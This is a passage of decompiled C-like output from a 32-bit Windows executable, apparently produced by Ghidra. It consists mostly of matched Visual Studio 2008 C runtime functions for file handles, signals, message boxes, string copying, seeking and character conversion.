  else {
    __lock(0xb);
    for (; iVar5 < 0x40; iVar5 = iVar5 + 1) {
      puVar4 = (undefined4 *)(&DAT_004257a0)[iVar5];
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)__calloc_crt(0x20,0x40);
        if (puVar4 != (undefined4 *)0x0) {
          (&DAT_004257a0)[iVar5] = puVar4;
          DAT_00425788 = DAT_00425788 + 0x20;
          for (; puVar4 < (undefined4 *)((&DAT_004257a0)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
            *(undefined *)(puVar4 + 1) = 0;
            *puVar4 = 0xffffffff;
            *(undefined *)((int)puVar4 + 5) = 10;
            puVar4[2] = 0;
          }
          local_20 = iVar5 << 5;
          *(undefined *)((&DAT_004257a0)[local_20 >> 5] + 4) = 1;
          iVar2 = ___lock_fhandle(local_20);
          if (iVar2 == 0) {
            local_20 = -1;
          }
        }
        break;
      }
      for (; puVar4 < (undefined4 *)((&DAT_004257a0)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
        if ((*(byte *)(puVar4 + 1) & 1) == 0) {
          if (puVar4[2] == 0) {
            __lock(10);
            if (puVar4[2] == 0) {
              BVar3 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(puVar4 + 3),4000);
              if (BVar3 == 0) {
                bVar1 = true;
              }
              else {
                puVar4[2] = puVar4[2] + 1;
              }
            }
            FUN_004149df();
          }
          if (!bVar1) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            if ((*(byte *)(puVar4 + 1) & 1) == 0) {
              *(undefined *)(puVar4 + 1) = 1;
              *puVar4 = 0xffffffff;
              local_20 = ((int)puVar4 - (&DAT_004257a0)[iVar5] >> 6) + iVar5 * 0x20;
              break;
            }
            LeaveCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
          }
        }
      }
      if (local_20 != -1) break;
    }
    FUN_00414a9d();
  }
  return local_20;
}



void FUN_004149df(void)

{
  FUN_0040e2eb(10);
  return;
}



void FUN_00414a9d(void)

{
  FUN_0040e2eb(0xb);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2008 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425788)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_004257a0)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_004257a0)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_00414b68;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_00414b68:
        FUN_00414b7d();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_00414b7d(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2008 Release

void __initp_misc_cfltcvt_tab(void)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  uVar3 = 0;
  do {
    piVar1 = (int *)((int)&PTR_LAB_00422dd0 + uVar3);
    iVar2 = __encode_pointer(*piVar1);
    uVar3 = uVar3 + 4;
    *piVar1 = iVar2;
  } while (uVar3 < 0x28);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



void FUN_00414be1(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl _inconsistency(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)__decode_pointer(DAT_00424408);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __initp_eh_hooks
// 
// Library: Visual Studio 2008 Release

void __initp_eh_hooks(void)

{
  DAT_00424408 = __encode_pointer(0x414ba8);
  return;
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2008 Release

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_0042440c = param_1;
  DAT_00424410 = param_1;
  DAT_00424414 = param_1;
  DAT_00424418 = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2008 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_00422dbc * 0xc + param_3);
  if ((DAT_00422dbc * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_sigabrt
// 
// Library: Visual Studio 2008 Release

_PHNDLR __cdecl ___get_sigabrt(void)

{
  _PHNDLR p_Var1;
  
  p_Var1 = (_PHNDLR)__decode_pointer(DAT_00424414);
  return p_Var1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2008 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  code *pcVar3;
  int iVar4;
  code *pcVar5;
  undefined4 extraout_ECX;
  code **ppcVar6;
  _ptiddata p_Var7;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var7 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppcVar6 = (code **)&DAT_0042440c;
        iVar4 = DAT_0042440c;
        goto LAB_00414d54;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_00414d32;
        if (_SigNum != 8) goto LAB_00414d16;
      }
    }
    p_Var7 = __getptd_noexit();
    if (p_Var7 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var7->_pxcptacttab);
    ppcVar6 = (code **)(uVar1 + 8);
    pcVar3 = *ppcVar6;
  }
  else {
    if (_SigNum == 0xf) {
      ppcVar6 = (code **)&DAT_00424418;
      iVar4 = DAT_00424418;
    }
    else if (_SigNum == 0x15) {
      ppcVar6 = (code **)&DAT_00424410;
      iVar4 = DAT_00424410;
    }
    else {
      if (_SigNum != 0x16) {
LAB_00414d16:
        piVar2 = __errno();
        *piVar2 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return -1;
      }
LAB_00414d32:
      ppcVar6 = (code **)&DAT_00424414;
      iVar4 = DAT_00424414;
    }
LAB_00414d54:
    local_20 = 1;
    pcVar3 = (code *)__decode_pointer(iVar4);
  }
  iVar4 = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    iVar4 = __exit(3);
  }
  if (local_20 != iVar4) {
    __lock(iVar4);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var7->_tpxcptinfoptrs;
    p_Var7->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var7->_tfpecode;
      p_Var7->_tfpecode = 0x8c;
      goto LAB_00414db8;
    }
  }
  else {
LAB_00414db8:
    if (_SigNum == 8) {
      for (local_28 = DAT_00422db0; local_28 < DAT_00422db4 + DAT_00422db0; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var7->_pxcptacttab) = 0;
      }
      goto LAB_00414df2;
    }
  }
  pcVar5 = (code *)__encoded_null();
  *ppcVar6 = pcVar5;
LAB_00414df2:
  FUN_00414e13();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var7->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var7->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var7->_tfpecode = local_34;
  }
  return 0;
}



void FUN_00414e13(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_0040e2eb(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00414e4f(undefined4 param_1)

{
  _DAT_00424420 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00414e5e(undefined4 param_1)

{
  _DAT_0042442c = param_1;
  return;
}



// Library Function - Single Match
//  ___crtMessageBoxA
// 
// Library: Visual Studio 2008 Release

int __cdecl ___crtMessageBoxA(LPCSTR _LpText,LPCSTR _LpCaption,UINT _UType)

{
  int iVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  code *pcVar3;
  code *pcVar4;
  int iVar5;
  undefined local_18 [8];
  byte local_10;
  undefined local_c [4];
  int local_8;
  
  iVar1 = __encoded_null();
  local_8 = 0;
  if (DAT_00424430 == 0) {
    hModule = LoadLibraryA(s_USER32_DLL_0041cbc4);
    if (hModule == (HMODULE)0x0) {
      return 0;
    }
    pFVar2 = GetProcAddress(hModule,s_MessageBoxA_0041cbb8);
    if (pFVar2 == (FARPROC)0x0) {
      return 0;
    }
    DAT_00424430 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetActiveWindow_0041cba8);
    DAT_00424434 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetLastActivePopup_0041cb94);
    DAT_00424438 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetUserObjectInformationA_0041cb78);
    DAT_00424440 = __encode_pointer((int)pFVar2);
    if (DAT_00424440 != 0) {
      pFVar2 = GetProcAddress(hModule,s_GetProcessWindowStation_0041cb60);
      DAT_0042443c = __encode_pointer((int)pFVar2);
    }
  }
  if ((DAT_0042443c != iVar1) && (DAT_00424440 != iVar1)) {
    pcVar3 = (code *)__decode_pointer(DAT_0042443c);
    pcVar4 = (code *)__decode_pointer(DAT_00424440);
    if (((pcVar3 != (code *)0x0) && (pcVar4 != (code *)0x0)) &&
       (((iVar5 = (*pcVar3)(), iVar5 == 0 ||
         (iVar5 = (*pcVar4)(iVar5,1,local_18,0xc,local_c), iVar5 == 0)) || ((local_10 & 1) == 0))))
    {
      _UType = _UType | 0x200000;
      goto LAB_00414faf;
    }
  }
  if ((((DAT_00424434 != iVar1) &&
       (pcVar3 = (code *)__decode_pointer(DAT_00424434), pcVar3 != (code *)0x0)) &&
      (local_8 = (*pcVar3)(), local_8 != 0)) &&
     ((DAT_00424438 != iVar1 &&
      (pcVar3 = (code *)__decode_pointer(DAT_00424438), pcVar3 != (code *)0x0)))) {
    local_8 = (*pcVar3)(local_8);
  }
LAB_00414faf:
  pcVar3 = (code *)__decode_pointer(DAT_00424430);
  if (pcVar3 == (code *)0x0) {
    return 0;
  }
  iVar1 = (*pcVar3)(local_8,_LpText,_LpCaption,_UType);
  return iVar1;
}



// Library Function - Single Match
//  _strncpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strncpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src,rsize_t _MaxCount)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  rsize_t rVar4;
  errno_t eVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (char *)0x0) {
      if (_SizeInBytes == 0) {
        return 0;
      }
    }
    else {
LAB_00414ffc:
      if (_SizeInBytes != 0) {
        if (_MaxCount == 0) {
          *_Dst = '\0';
          return 0;
        }
        if (_Src != (char *)0x0) {
          pcVar3 = _Dst;
          rVar4 = _SizeInBytes;
          if (_MaxCount == 0xffffffff) {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if (cVar1 == '\0') break;
              rVar4 = rVar4 - 1;
            } while (rVar4 != 0);
          }
          else {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if ((cVar1 == '\0') || (rVar4 = rVar4 - 1, rVar4 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pcVar3 = '\0';
            }
          }
          if (rVar4 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInBytes - 1] = '\0';
            return 0x50;
          }
          *_Dst = '\0';
          piVar2 = __errno();
          eVar5 = 0x22;
          *piVar2 = 0x22;
          goto LAB_0041500d;
        }
        *_Dst = '\0';
      }
    }
  }
  else if (_Dst != (char *)0x0) goto LAB_00414ffc;
  piVar2 = __errno();
  eVar5 = 0x16;
  *piVar2 = 0x16;
LAB_0041500d:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar5;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_error_mode(int _Mode)

{
  int *piVar1;
  int iVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar2 = DAT_004239b8;
      DAT_004239b8 = _Mode;
      return iVar2;
    }
    if (_Mode == 3) {
      return DAT_004239b8;
    }
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_00423cf8 = _DAT_00423cf8 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_00415150:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_00415150;
      }
    }
    pbVar1 = (byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425788)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
        puVar1 = ___doserrno();
        *puVar1 = 0;
        piVar2 = __errno();
        *piVar2 = 9;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        local_28._4_4_ = 0xffffffff;
        local_28._0_4_ = 0xffffffff;
      }
      else {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_004152b3();
      }
      goto LAB_004152ad;
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_004152ad:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



void FUN_004152b3(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2008 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  uint uVar2;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
    return 0;
  }
  if ((_FileHandle < 0) || (DAT_00425788 <= (uint)_FileHandle)) {
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    uVar2 = 0;
  }
  else {
    uVar2 = (int)*(char *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
            0x40;
  }
  return uVar2;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  wint_t wVar1;
  BOOL BVar2;
  DWORD DVar3;
  UINT CodePage;
  wchar_t *lpWideCharStr;
  int cchWideChar;
  CHAR *lpMultiByteStr;
  int cbMultiByte;
  LPCSTR lpDefaultChar;
  LPBOOL lpUsedDefaultChar;
  DWORD local_14;
  CHAR local_10 [8];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (DAT_00422df8 != 0) {
    if (DAT_00422f18 == (HANDLE)0xfffffffe) {
      ___initconout();
    }
    if (DAT_00422f18 == (HANDLE)0xffffffff) goto LAB_004153cd;
    BVar2 = WriteConsoleW(DAT_00422f18,&_WCh,1,&local_14,(LPVOID)0x0);
    if (BVar2 != 0) {
      DAT_00422df8 = 1;
      goto LAB_004153cd;
    }
    if ((DAT_00422df8 != 2) || (DVar3 = GetLastError(), DVar3 != 0x78)) goto LAB_004153cd;
    DAT_00422df8 = 0;
  }
  lpUsedDefaultChar = (LPBOOL)0x0;
  lpDefaultChar = (LPCSTR)0x0;
  cbMultiByte = 5;
  lpMultiByteStr = local_10;
  cchWideChar = 1;
  lpWideCharStr = &_WCh;
  DVar3 = 0;
  CodePage = GetConsoleOutputCP();
  DVar3 = WideCharToMultiByte(CodePage,DVar3,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  if (DAT_00422f18 != (HANDLE)0xffffffff) {
    WriteConsoleA(DAT_00422f18,local_10,DVar3,&local_14,(LPVOID)0x0);
  }
LAB_004153cd:
  wVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar1;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_00415435;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_00415435:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2008 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2008 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2008 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __fputwc_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __fputwc_nolock(wchar_t _Ch,FILE *_File)

{
  int *piVar1;
  wint_t wVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  errno_t eVar6;
  int local_14;
  char local_10 [8];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    iVar3 = __fileno(_File);
    if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
      puVar5 = &DAT_00422448;
    }
    else {
      iVar3 = __fileno(_File);
      uVar4 = __fileno(_File);
      puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_004257a0)[iVar3 >> 5]);
    }
    if ((puVar5[0x24] & 0x7f) != 2) {
      iVar3 = __fileno(_File);
      if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
        puVar5 = &DAT_00422448;
      }
      else {
        iVar3 = __fileno(_File);
        uVar4 = __fileno(_File);
        puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_004257a0)[iVar3 >> 5]);
      }
      if ((puVar5[0x24] & 0x7f) != 1) {
        iVar3 = __fileno(_File);
        if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
          puVar5 = &DAT_00422448;
        }
        else {
          iVar3 = __fileno(_File);
          uVar4 = __fileno(_File);
          puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_004257a0)[iVar3 >> 5]);
        }
        if ((puVar5[4] & 0x80) != 0) {
          eVar6 = _wctomb_s(&local_14,local_10,5,_Ch);
          if ((eVar6 == 0) && (iVar3 = 0, 0 < local_14)) {
            do {
              piVar1 = &_File->_cnt;
              *piVar1 = *piVar1 + -1;
              if (*piVar1 < 0) {
                uVar4 = __flsbuf((int)local_10[iVar3],_File);
              }
              else {
                *_File->_ptr = local_10[iVar3];
                uVar4 = (uint)(byte)*_File->_ptr;
                _File->_ptr = _File->_ptr + 1;
              }
            } while ((uVar4 != 0xffffffff) && (iVar3 = iVar3 + 1, iVar3 < local_14));
          }
          goto LAB_00415713;
        }
      }
    }
  }
  piVar1 = &_File->_cnt;
  *piVar1 = *piVar1 + -2;
  if (*piVar1 < 0) {
    __flswbuf((uint)(ushort)_Ch,_File);
  }
  else {
    *(wchar_t *)_File->_ptr = _Ch;
    _File->_ptr = _File->_ptr + 2;
  }
LAB_00415713:
  wVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar2;
}



// Library Function - Single Match
//  __get_printf_count_output
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(DAT_00424444 == (DAT_00422044 | 1));
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_0042444c;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_00424448;
    do {
      piVar2 = piVar1;
      if (DAT_0042444c == (int *)0x0) goto LAB_0041577c;
      piVar1 = DAT_0042444c;
    } while (*DAT_0042444c != *(int *)(param_1 + 4));
    piVar2[1] = DAT_0042444c[1];
    _free(_Memory);
LAB_0041577c:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_0041579f();
  return;
}



void FUN_0041579f(void)

{
  FUN_0040e2eb(0xe);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  size_t sVar2;
  uint uVar3;
  size_t local_20;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    sVar2 = 0xffffffff;
  }
  else {
    if (DAT_0042576c == 3) {
      __lock(4);
      uVar3 = ___sbh_find_block((int)_Memory);
      if (uVar3 != 0) {
        local_20 = *(int *)((int)_Memory + -4) - 9;
      }
      FUN_00415842();
      if (uVar3 != 0) {
        return local_20;
      }
    }
